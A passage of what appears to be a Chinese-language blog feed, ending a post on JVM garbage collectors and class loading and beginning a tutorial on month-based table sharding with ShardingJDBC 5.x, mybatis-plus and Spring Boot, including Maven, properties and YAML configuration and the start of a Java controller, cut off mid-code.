-XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC<br>java version “1.8.0_211”<br>Java(TM) SE Runtime Environment (build 1.8.0_211-b12)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)<br>JDK1.8 默认使用的是 Parallel Scavenge + Parallel Old，如果指定了-XX:+UseParallelGC 参数，则默认指定了-XX:+UseParallelOldGC，可以使用-XX:-UseParallelOldGC 来禁用该功能</p><p>Serial Old 收集器<br>Serial 收集器的老年代版本，它同样是一个单线程收集器。它主要有两大用途：一种用途是在 JDK1.5 以及以前的版本中与 Parallel Scavenge 收集器搭配使用，另一种用途是作为 CMS 收集器的后备方案。</p><p>Parallel Old 收集器<br>Parallel Scavenge 收集器的老年代版本。使用多线程和“标记-整理”算法。在注重吞吐量以及 CPU 资源的场合，都可以优先考虑 Parallel Scavenge 收集器和 Parallel Old 收集器。</p><p>CMS 收集器<br>CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。它非常符合在注重用户体验的应用上使用。</p><p>CMS（Concurrent Mark Sweep）收集器是 HotSpot 虚拟机第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。</p><p>从名字中的Mark Sweep这两个词可以看出，CMS 收集器是一种 “标记-清除”算法实现的，它的运作过程相比于前面几种垃圾收集器来说更加复杂一些。整个过程分为四个步骤：</p><p>初始标记： 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ；<br>并发标记： 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。<br>重新标记： 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短<br>并发清除： 开启用户线程，同时 GC 线程开始对未标记的区域做清扫。<br>CMS 垃圾收集器 </p><p>从它的名字就可以看出它是一款优秀的垃圾收集器，主要优点：并发收集、低停顿。但是它有下面三个明显的缺点：</p><p>对 CPU 资源敏感；<br>无法处理浮动垃圾；<br>它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量空间碎片产生。<br>G1 收集器<br>G1 (Garbage-First) 是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足 GC 停顿时间要求的同时,还具备高吞吐量性能特征.</p><p>被视为 JDK1.7 中 HotSpot 虚拟机的一个重要进化特征。它具备以下特点：</p><p>并行与并发：G1 能充分利用 CPU、多核环境下的硬件优势，使用多个 CPU（CPU 或者 CPU 核心）来缩短 Stop-The-World 停顿时间。部分其他收集器原本需要停顿 Java 线程执行的 GC 动作，G1 收集器仍然可以通过并发的方式让 java 程序继续执行。<br>分代收集：虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但是还是保留了分代的概念。<br>空间整合：与 CMS 的“标记-清理”算法不同，G1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。<br>可预测的停顿：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内。<br>G1 收集器的运作大致分为以下几个步骤：</p><p>初始标记<br>并发标记<br>最终标记<br>筛选回收<br>G1 收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的 Region(这也就是它的名字 Garbage-First 的由来) 。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。</p><p>ZGC 收集器<br>与 CMS 中的 ParNew 和 G1 类似，ZGC 也采用标记-复制算法，不过 ZGC 对该算法做了重大改进。</p><p>在 ZGC 中出现 Stop The World 的情况会更少！</p><h1><span id="总结">总结</span></h1><p>总过程如下：<br>程序员编写JAVA代码，保存为.java文件 –&gt; JDK再将java文件编译成.class文件 –&gt; 虚拟机加载.class文件 –&gt; JVM执行类加载器（参考上面的类加载过程,new一个对象时触发） –&gt; 类加载完后会开始分配内存（Main方法类会在虚拟机启动时就初始化） –&gt;  </p><p>对象内存分配完后执行init方法（执行构造方法） –&gt; 但对象未被引用时可能会被回收（取决于回收算法） –&gt; 卸载(前提是满足条件)。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;网上的资料比较杂，且少有成体系的资料，因此收集资料并按照自己的理解做了一下整合，本文为自我理解与总结，不代表标准答案。&lt;/p&gt;
&lt;h2 id=&quot;从hello-world开始&quot;&gt;&lt;a href=&quot;#从hello-world开始&quot; class=&quot;headerlink&quot; title=&quot;从hello world开始&quot;&gt;&lt;/a&gt;从hello world开始&lt;/h2&gt;&lt;p&gt;java从编写’System.out.println(“hello world”)’ 开始，并编译运行，在这期间到底发生了什么。&lt;/p&gt;
&lt;h3 id=&quot;java文件从编译到结束全过程（类加载过程）&quot;&gt;&lt;a href=&quot;#java文件从编译到结束全过程（类加载过程）&quot; class=&quot;headerlink&quot; title=&quot;.java文件从编译到结束全过程（类加载过程）&quot;&gt;&lt;/a&gt;.java文件从编译到结束全过程（类加载过程）&lt;/h3&gt;&lt;p&gt;一个.java文件的完整周期是 java编码成jvm可识别的.class文件， 然后大致流程是： 加载–&amp;gt;连接–&amp;gt;初始化–&amp;gt;使用–&amp;gt;卸载&lt;/p&gt;
&lt;h4 id=&quot;1-加载过程&quot;&gt;&lt;a href=&quot;#1-加载过程&quot; class=&quot;headerlink&quot; title=&quot;1. 加载过程&quot;&gt;&lt;/a&gt;1. 加载过程&lt;/h4&gt;&lt;p&gt; 1、通过全类名获取定义此类的二进制字节流（类似反射）&lt;br&gt; 2、将字节流所代表的静态存储结构转换为JVM方法区的运行时数据结构&lt;br&gt; 3、在内存中生成一个代表该类的 java.lang.Class 对象，作为方法区这些数据的访问入口(这样代码才能通过全类名访问到该对象)&lt;br&gt; PS:数组类型不通过类加载器创建，它由JAVA虚拟机直接创建，数组的加载可通过自定义类加载器控制加载方式&lt;/p&gt;
&lt;h5 id=&quot;1-1-加载过程中所需要的类加载器&quot;&gt;&lt;a href=&quot;#1-1-加载过程中所需要的类加载器&quot; class=&quot;headerlink&quot; title=&quot;1.1 加载过程中所需要的类加载器&quot;&gt;&lt;/a&gt;1.1 加载过程中所需要的类加载器&lt;/h5&gt;&lt;p&gt;JVM中有三个类加载器，除了 BootstrapClassLoader 其他类加载器均由 Java 实现且全部继承自java.lang.ClassLoader&lt;/p&gt;
&lt;p&gt;1、BootstrapClassLoader(启动类加载器) ：最顶层的加载类，由 C++实现，负责加载 %JAVA_HOME%/lib目录下的 jar 包和类或者被 -Xbootclasspath参数指定的路径中的所有类。&lt;br&gt;2、ExtensionClassLoader(扩展类加载器) ：主要负责加载 %JRE_HOME%/lib/ext 目录下的 jar 包和类，或被 java.ext.dirs 系统变量所指定的路径下的 jar 包。&lt;br&gt;3、AppClassLoader(应用程序类加载器) ：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。&lt;/p&gt;</summary>
    
    
    
    <category term="JAVA" scheme="https://reiner.host/categories/JAVA/"/>
    
    
    <category term="JVM" scheme="https://reiner.host/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>使用shardingJdbc-5.x+mybatis-plus实现按月分表查询</title>
    <link href="https://reiner.host/posts/80ca5d35.html"/>
    <id>https://reiner.host/posts/80ca5d35.html</id>
    <published>2021-12-25T06:09:22.000Z</published>
    <updated>2021-12-25T06:47:13.734Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="使用场景">使用场景</span></h1><p>适用于单库，日志表过大的问题，如每月产生几千万条日志，还不能清理，必须存档，其它业务表反而没这么大量时，可以使用分表来解决。</p><p>可以按实际情况来决定是按年分表还是按月分表，每年产生的数据量过亿时可以按月分表。</p><h2><span id="本文使用的框架">本文使用的框架</span></h2><p>使用spring boot 2.x + mybatis-plus + shardingjdbc5.x + druid </p><p>shardingjdbc非常坑的一个点，每个版本变一次配置，官方文档写得不清不楚，通过GITHUB找到官方示例，发现示例也很少，最后是通过网上的博文+示例+文档才搞定。</p><h2><span id="配置maven依赖">配置maven依赖</span></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">sharding-sphere.version</span>&gt;</span>5.0.0<span class="tag">&lt;/<span class="name">sharding-sphere.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mybatis-plus.version</span>&gt;</span>3.4.2<span class="tag">&lt;/<span class="name">mybatis-plus.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 不能用druid-springboot-starter 会无法启动 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid-spring-boot-starter --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">    &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">    &lt;version&gt;1.1.22&lt;/version&gt;</span></span><br><span class="line"><span class="comment">&lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">&lt;!-- &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;com.baomidou&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;$&#123;mybatis-plus.version&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt; --&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.shardingsphere/sharding-jdbc-spring-boot-starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shardingsphere<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shardingsphere-jdbc-core-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis-plus.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2><span id="配置数据源与shardingjdbc分表策略">配置数据源与shardingjdbc分表策略</span></h2><p>按月分表使用单库，所以这里只配置一个数据源</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">spring.shardingsphere.mode.type=Standalone</span></span><br><span class="line"><span class="string">spring.shardingsphere.mode.repository.type=File</span></span><br><span class="line"><span class="string">spring.shardingsphere.mode.overwrite=true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置真实数据源</span></span><br><span class="line"><span class="string">spring.shardingsphere.datasource.names=db0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置第 1 个数据源</span></span><br><span class="line"><span class="string">spring.shardingsphere.datasource.db0.type=com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line"><span class="string">spring.shardingsphere.datasource.db0.driver-class-name=com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="string">spring.shardingsphere.datasource.db0.url=jdbc:mysql://localhost:3306/db0</span></span><br><span class="line"><span class="string">spring.shardingsphere.datasource.db0.username=root</span></span><br><span class="line"><span class="string">spring.shardingsphere.datasource.db0.password=reiner</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印执行的数据库以及语句 默认值: false， </span></span><br><span class="line"><span class="string">sharding.jdbc.data-source.props.sql-simple=true</span></span><br><span class="line"><span class="comment">#打开sql输出日志</span></span><br><span class="line"><span class="string">spring.shardingsphere.props.sql-show=true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#默认的分片键</span></span><br><span class="line"><span class="comment">#spring.shardingsphere.rules.sharding.default-database-strategy.standard.sharding-column=order_id</span></span><br><span class="line"><span class="comment">#使用的分片策略</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.binding-tables[0]=t_order</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置如何生成要操作的表名，这里根据时间自动添加表后缀，如:t_order_2021_12</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.tables.t_order.actual-data-nodes=db0.t_order_$-&gt;&#123;2019..2099&#125;_$&#123;(1..12).collect&#123;t</span> <span class="string">-&gt;t.toString().padLeft(2,&#x27;0&#x27;)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#分片键,按时间分表</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.tables.t_order.table-strategy.standard.sharding-column=create_time</span></span><br><span class="line"><span class="comment">#分片算法对应的配置名称</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.tables.t_order.table-strategy.standard.sharding-algorithm-name=t-order-inline</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spring.shardingsphere.rules.sharding.tables.t_order.key-generate-strategy.column=order_id #不分库，不需要</span></span><br><span class="line"><span class="comment">#ID生成 雪花算法</span></span><br><span class="line"><span class="comment">#spring.shardingsphere.rules.sharding.tables.t_order.key-generate-strategy.key-generator-name=SNOWFLAKE</span></span><br><span class="line"><span class="comment">#配置分片规则,按时间类型分片</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.sharding-algorithms.t-order-inline.type=INTERVAL</span></span><br><span class="line"><span class="comment">#时间格式</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.sharding-algorithms.t-order-inline.props.datetime-pattern=yyyy-MM-dd</span> <span class="string">HH:mm:ss</span></span><br><span class="line"><span class="comment">#最小的分片时间</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.sharding-algorithms.t-order-inline.props.datetime-lower=2021-01-01</span> <span class="number">00</span><span class="string">:00:00</span></span><br><span class="line"><span class="comment">#表的后缀</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.sharding-algorithms.t-order-inline.props.sharding-suffix-pattern=yyyy_MM</span></span><br><span class="line"><span class="comment">#按月分表</span></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.sharding-algorithms.t-order-inline.props.datetime-interval-unit=MONTHS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.key-generators.snowflake.type=SNOWFLAKE</span></span><br><span class="line"></span><br><span class="line"><span class="string">spring.shardingsphere.rules.sharding.key-generators.snowflake.props.worker-id=123</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="mybatis-plus的配置">mybatis plus的配置</span></h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7999</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sharding-test</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span> </span><br><span class="line">  <span class="attr">level:</span> </span><br><span class="line">    <span class="attr">root:</span> <span class="string">info</span></span><br><span class="line"><span class="comment">#  org: </span></span><br><span class="line"><span class="comment">#    springframework: </span></span><br><span class="line"><span class="comment">#      web: DEBUG</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">./logs/$&#123;spring.application.name&#125;-log.log</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">logic-delete-field:</span> <span class="string">IS_DELETE</span>  <span class="comment"># 全局逻辑删除的实体字段名(since 3.3.0,配置后可以忽略不配置步骤2)</span></span><br><span class="line">      <span class="attr">logic-delete-value:</span> <span class="number">1</span> <span class="comment"># 逻辑已删除值(默认为 1)</span></span><br><span class="line">      <span class="attr">logic-not-delete-value:</span> <span class="number">0</span> <span class="comment"># 逻辑未删除值(默认为 0)</span></span><br><span class="line"><span class="comment">#      capital-mode: true</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">typeAliasesPackage:</span> <span class="string">com.reiner.sharding.test.model</span></span><br><span class="line"><span class="comment"># spring boot集成mybatis的方式打印sql </span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">true</span> </span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记得加上mybatis plus扫描注解：<code>@MapperScan(value = &quot;com.reiner.sharding.test.mapper&quot;)</code></p><h2><span id="java测试代码">java测试代码</span></h2><p>控制器代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyEditorSupport;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.propertyeditors.CustomDateEditor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.propertyeditors.CustomNumberEditor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.propertyeditors.StringTrimmerEditor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.WebDataBinder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.InitBinder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span 